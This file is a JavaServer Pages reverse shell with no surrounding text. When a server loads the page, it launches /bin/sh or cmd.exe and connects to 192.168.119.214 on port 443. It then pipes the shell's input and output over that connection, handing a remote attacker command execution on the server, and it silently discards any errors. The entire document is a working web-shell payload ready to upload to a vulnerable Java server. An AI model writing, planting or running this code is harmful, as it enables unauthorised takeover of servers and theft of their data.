<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream qj;
    OutputStream rj;

    StreamConnector( InputStream qj, OutputStream rj )
    {
      this.qj = qj;
      this.rj = rj;
    }

    public void run()
    {
      BufferedReader pe  = null;
      BufferedWriter jic = null;
      try
      {
        pe  = new BufferedReader( new InputStreamReader( this.qj ) );
        jic = new BufferedWriter( new OutputStreamWriter( this.rj ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = pe.read( buffer, 0, buffer.length ) ) > 0 )
        {
          jic.write( buffer, 0, length );
          jic.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( pe != null )
          pe.close();
        if( jic != null )
          jic.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "192.168.119.214", 443 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
